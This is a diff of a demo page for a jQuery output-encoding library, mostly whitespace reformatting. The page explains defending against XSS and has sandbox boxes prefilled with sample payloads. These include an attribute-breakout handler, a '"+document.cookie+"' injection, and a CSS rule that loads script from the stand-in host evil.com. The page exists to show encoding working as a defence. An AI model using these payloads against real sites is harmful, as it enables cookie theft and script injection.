@@ -29,45 +29,45 @@
             src="http://alexgorbatchev.com/pub/sh/current/scripts/shBrushJScript.js"></script>
     <!-- Page Scripts -->
     <script type="text/javascript">
-        $(document).ready(function() {
-            $('#submit-entity-payload').click(function() {
+        $(document).ready(function () {
+            $('#submit-entity-payload').click(function () {
                 var payload = $('#entity-payload').val();
-                $('#entity-container').html( $.encoder.encodeForHTML($.encoder.canonicalize(payload)) );
+                $('#entity-container').html($.encoder.encodeForHTML($.encoder.canonicalize(payload)));
             });
 
-            $('#submit-attr-payload').click(function() {
+            $('#submit-attr-payload').click(function () {
                 var payload = $('#attr-payload').val();
-                $('#attr-container').html( '<div id="attr-payload-val" class="' +
-                        $.encoder.encodeForHTMLAttribute($.encoder.canonicalize(payload)) + '">' + $.encoder.encodeForHTML( $.encoder.encodeForHTMLAttribute( $.encoder.canonicalize(payload) ) ) +
-                        '</div>' );
+                $('#attr-container').html('<div id="attr-payload-val" class="' +
+                        $.encoder.encodeForHTMLAttribute($.encoder.canonicalize(payload)) + '">' + $.encoder.encodeForHTML($.encoder.encodeForHTMLAttribute($.encoder.canonicalize(payload))) +
+                        '</div>');
             });
 
-            $('#submit-css-payload').click(function() {
+            $('#submit-css-payload').click(function () {
                 var payload = $('#css-payload').val();
                 $('#css-container').html(
                         '<div id="css-payload-val" style="background-color: ' +
-                        $.encoder.encodeForCSS($.encoder.canonicalize(payload)) + ';">' +
-                        $.encoder.encodeForHTML( $.encoder.encodeForCSS($.encoder.canonicalize(payload)) ) +
-                        '</div>' );
+                                $.encoder.encodeForCSS($.encoder.canonicalize(payload)) + ';">' +
+                                $.encoder.encodeForHTML($.encoder.encodeForCSS($.encoder.canonicalize(payload))) +
+                                '</div>');
             });
 
-            $('#submit-js-payload').click(function() {
+            $('#submit-js-payload').click(function () {
                 var payload = $('#js-payload').val();
                 $('#js-container').html(
                         '<div id="js-payload-val" onmouseover="alert(\'' +
-                        $.encoder.encodeForJavascript($.encoder.canonicalize(payload)) +
-                        '\');">Hover over this div to see the result</div>'
+                                $.encoder.encodeForJavascript($.encoder.canonicalize(payload)) +
+                                '\');">Hover over this div to see the result</div>'
                 );
             });
 
-            $('#submit-url-payload').click(function() {
+            $('#submit-url-payload').click(function () {
                 var payload = $('#url-payload').val();
                 $('#url-container').html(
                         '<a style="color:white;" href="#user-supplied-data=' +
-                        $.encoder.encodeForURL($.encoder.canonicalize(payload)) +
-                        '">' +
-                        $.encoder.encodeForHTML($.encoder.encodeForURL($.encoder.canonicalize(payload))) +
-                        '</a>'
+                                $.encoder.encodeForURL($.encoder.canonicalize(payload)) +
+                                '">' +
+                                $.encoder.encodeForHTML($.encoder.encodeForURL($.encoder.canonicalize(payload))) +
+                                '</a>'
                 );
             });
 
@@ -158,33 +158,54 @@
 
     <div class="site-header">jQuery Encoder</div>
 
-        <div class="site-menu">
-        <span><a href="https://github.com/chrisisbeef/jquery-encoder/blob/master/README.textile" target="_extern" id="link-docs" class="nav-link">Documentation</a></span>|
-        <span><a href="https://github.com/chrisisbeef/jquery-encoder/issues" target="_extern" id="link-issues" class="nav-link">Issue Tracker</a></span>|
-        <span><a href="https://github.com/chrisisbeef/jquery-encoder/raw/master/jquery-encoder-0.1.0.js" target="_extern" id="link-download" class="nav-link">Download</a></span>
-        </div>
+    <div class="site-menu">
+        <span><a href="https://github.com/chrisisbeef/jquery-encoder/blob/master/README.textile" target="_extern"
+                 id="link-docs" class="nav-link">Documentation</a></span>|
+        <span><a href="https://github.com/chrisisbeef/jquery-encoder/issues" target="_extern" id="link-issues"
+                 class="nav-link">Issue Tracker</a></span>|
+        <span><a href="https://github.com/chrisisbeef/jquery-encoder/raw/master/jquery-encoder-0.1.0.js"
+                 target="_extern" id="link-download" class="nav-link">Download</a></span>
+    </div>
 
 
     <div class="section-title">What is jQuery-Encoder</div>
 
     <div class="section-body">
-        jqencoder is a jQuery plugin whose goal is to provide jQuery developers with a means to do contextual output encoding on untrusted data. As applications become more and more reliant on rich client technologies the need for client-side code to have the ability to properly escape untrusted data becomes exponentially more important.
+        jqencoder is a jQuery plugin whose goal is to provide jQuery developers with a means to do contextual output
+        encoding on untrusted data. As applications become more and more reliant on rich client technologies the need
+        for client-side code to have the ability to properly escape untrusted data becomes exponentially more important.
     </div>
 
     <div class="section-title">Why is Contextual Output Encoding Important?</div>
 
     <div class="section-body">
-        Proper contextual output encoding is the primary and most effective way to combat Cross-Site Scripting (XSS) attacks. The premise is to use the escaping rules of the current context to not allow an attacker to break out of that context. The reason that output encoding is so important is because HTML, by nature, mixes code and data; thus an attacker can disguise code as data and that code can be executed unintentionally by other users.
+        Proper contextual output encoding is the primary and most effective way to combat Cross-Site Scripting (XSS)
+        attacks. The premise is to use the escaping rules of the current context to not allow an attacker to break out
+        of that context. The reason that output encoding is so important is because HTML, by nature, mixes code and
+        data; thus an attacker can disguise code as data and that code can be executed unintentionally by other users.
         <br/><br/>
-        There is a specific type of XSS Attack called DOM-Based XSS. The most dangerous factor of DOM-Based XSS is that attacker payloads are frequently *not* sent to the server; which means that any code on the server that is aimed at defending against XSS vulnerabilities will not be accessed, leaving your users wide open to attack. Client side contextual encoding is the answer to this problem. By encoding untrusted data in the correct context while dynamically building portions of the DOM or writing out Javascript, developers can effectively mitigate DOM-Based XSS attacks.
+        There is a specific type of XSS Attack called DOM-Based XSS. The most dangerous factor of DOM-Based XSS is that
+        attacker payloads are frequently *not* sent to the server; which means that any code on the server that is aimed
+        at defending against XSS vulnerabilities will not be accessed, leaving your users wide open to attack. Client
+        side contextual encoding is the answer to this problem. By encoding untrusted data in the correct context while
+        dynamically building portions of the DOM or writing out Javascript, developers can effectively mitigate
+        DOM-Based XSS attacks.
         <br/><br/>
-        Client side contextual encoding also holds a prominent responsibility in dynamic AJAX applications - primarily those who load data from 3rd party services and display that data on their page. The client has no control over the integrity of the data being sent to them in most cases, so it is important than when rendering data from an untrusted source, such as a public webservice, that the developer be able to encode that untrusted data for use in the correct context.
+        Client side contextual encoding also holds a prominent responsibility in dynamic AJAX applications - primarily
+        those who load data from 3rd party services and display that data on their page. The client has no control over
+        the integrity of the data being sent to them in most cases, so it is important than when rendering data from an
+        untrusted source, such as a public webservice, that the developer be able to encode that untrusted data for use
+        in the correct context.
     </div>
 
     <div class="section-title">How do you use jQEncoder?</div>
 
     <div class="section-body">
-        Using the plugin is very simple, there are both static and instance methods to provide the right type of output encoding for your current situation. The plugin also provides a canonicalization method, which is imperative for detecting attacks that use double or multi encoding when handling data from an untrusted source. If you are dealing with data that may contain encoding, you can first canonicalize that data, then re-encode it for the appropriate context.
+        Using the plugin is very simple, there are both static and instance methods to provide the right type of output
+        encoding for your current situation. The plugin also provides a canonicalization method, which is imperative for
+        detecting attacks that use double or multi encoding when handling data from an untrusted source. If you are
+        dealing with data that may contain encoding, you can first canonicalize that data, then re-encode it for the
+        appropriate context.
 
         <script type="syntaxhighlighter" class="brush: js"><![CDATA[
             $.post( 'http://untrusted.com/webservice', { parameter1: 'value' }, function(data) {
@@ -193,9 +214,11 @@
                 var cdata = $.canonicalize(data);
                 $('#element').encode('html', cdata);
             });
-        ]]></script>
+        ]]>
+        </script>
 
-        You can also use the static methods for dynamically building out your document instead of building elements using the DOM
+        You can also use the static methods for dynamically building out your document instead of building elements
+        using the DOM
 
         <script type="syntaxhighlighter" class="brush: js"><![CDATA[
             $.post( 'http://untrusted.com/webservice', { parameter1: 'value' }, function(data) {
@@ -204,7 +227,8 @@
                     '" style="background-color: ' + $.encoder.encodeForCSS($.encoder.canonicalize(data.background)) +
                     '">' + $.encoder.encodeForHTML($.encoder.canonicalize(data.html)) + '&lt;/div>' );
             }
-        ]]></script>
+        ]]>
+        </script>
 
     </div>
 
@@ -220,19 +244,23 @@
                     var payload = $('#entity-payload').val();
                     $('#entity-container').html( $.encoder.encodeForHTML(payload) );
                 });
-            ]]></script>
+            ]]>
+            </script>
             <br/><br/>
+
             <div style="float: left; margin-bottom: 10px;">
                 <textarea rows="4" cols="40" id="entity-payload">&lt;script>alert(1);&lt;/script></textarea>
             </div>
             <div id="entity-container" class="sandbox-result"></div>
             <input type="button" id="submit-entity-payload" value="Submit Payload"/>
+
             <div style="clear:both;"></div>
         </div>
 
         <div class="sandbox-test">
             <label for="attr-payload">Test HTML Attribute Encoding</label><br/>
-            Your payload will be injected directly into the value of the <code>class</code> attribute of an inner <code>div</code> element within the div to the right. This will done using the following code
+            Your payload will be injected directly into the value of the <code>class</code> attribute of an inner <code>div</code>
+            element within the div to the right. This will done using the following code
 
             <script type="syntaxhighlighter" class="brush: js"><![CDATA[
                 $('#submit-attr-payload').click(function() {
@@ -243,19 +271,22 @@
                             $.encoder.encodeForHTML( $.encoder.encodeForHTMLAttribute( payload ) ) +
                             '&lt;/div>' );
                 });
-            ]]></script>
+            ]]>
+            </script>
 
             <div style="float: left; margin-bottom: 10px;">
                 <textarea rows="4" cols="40" id="attr-payload">" onmouseover="alert(1);" onmouseout="</textarea>
             </div>
             <div id="attr-container" class="sandbox-result"></div>
             <input type="button" id="submit-attr-payload" value="Submit Payload"/>
+
             <div style="clear:both;"></div>
         </div>
 
         <div class="sandbox-test">
             <label for="css-payload">Test CSS Attribute Encoding</label><br/>
-            Your payload will be injected directly into the value of the <code>style</code> attribute of an inner <code>div</code> element within the div to the right. This will done using the following code
+            Your payload will be injected directly into the value of the <code>style</code> attribute of an inner <code>div</code>
+            element within the div to the right. This will done using the following code
 
             <script type="syntaxhighlighter" class="brush: js"><![CDATA[
                 $('#submit-css-payload').click(function() {
@@ -266,19 +297,23 @@
                             $.encoder.encodeForHTML( $.encoder.encodeForCSS(payload) ) +
                             '&lt;/div>' );
                 });
-            ]]></script>
+            ]]>
+            </script>
 
             <div style="float: left; margin-bottom: 10px;">
                 <textarea rows="4" cols="40" id="css-payload">black; -behavior: url(http://evil.com/evil.js)</textarea>
             </div>
             <div id="css-container" class="sandbox-result"></div>
             <input type="button" id="submit-css-payload" value="Submit Payload"/>
+
             <div style="clear:both;"></div>
         </div>
 
         <div class="sandbox-test">
             <label for="js-payload">Test Javascript Encoding</label><br/>
-            Your payload will be injected directly into the value of the <code>alert</code> function fired by the <code>onmouseover</code> attribute of an inner <code>div</code> element within the div to the right. This will done using the following code
+            Your payload will be injected directly into the value of the <code>alert</code> function fired by the <code>onmouseover</code>
+            attribute of an inner <code>div</code> element within the div to the right. This will done using the
+            following code
 
             <script type="syntaxhighlighter" class="brush: js"><![CDATA[
                 $('#submit-js-payload').click(function() {
@@ -289,19 +324,22 @@
                             '\');">Hover over this div to see the result&lt;/div>'
                     );
                 });
-            ]]></script>
+            ]]>
+            </script>
 
             <div style="float: left; margin-bottom: 10px;">
                 <textarea rows="4" cols="40" id="js-payload">"+document.cookie+"</textarea>
             </div>
             <div id="js-container" class="sandbox-result"></div>
             <input type="button" id="submit-js-payload" value="Submit Payload"/>
+
             <div style="clear:both;"></div>
         </div>
 
         <div class="sandbox-test">
             <label for="url-payload">Test URL Encoding</label><br/>
-            Your payload will be injected directly into the value of the <code>href</code> attribute of an inner <code>a</code> element within the div to the right. This will done using the following code
+            Your payload will be injected directly into the value of the <code>href</code> attribute of an inner
+            <code>a</code> element within the div to the right. This will done using the following code
 
             <script type="syntaxhighlighter" class="brush: js"><![CDATA[
                 $('#submit-url-payload').click(function() {
@@ -314,13 +352,15 @@
                             '&lt;/a>'
                     );
                 });
-            ]]></script>
+            ]]>
+            </script>
 
             <div style="float: left; margin-bottom: 10px;">
                 <textarea rows="4" cols="40" id="url-payload">test&overrideParm=pwnd</textarea>
             </div>
             <div id="url-container" class="sandbox-result"></div>
             <input type="button" id="submit-url-payload" value="Submit Payload"/>
+
             <div style="clear:both;"></div>
         </div>
 
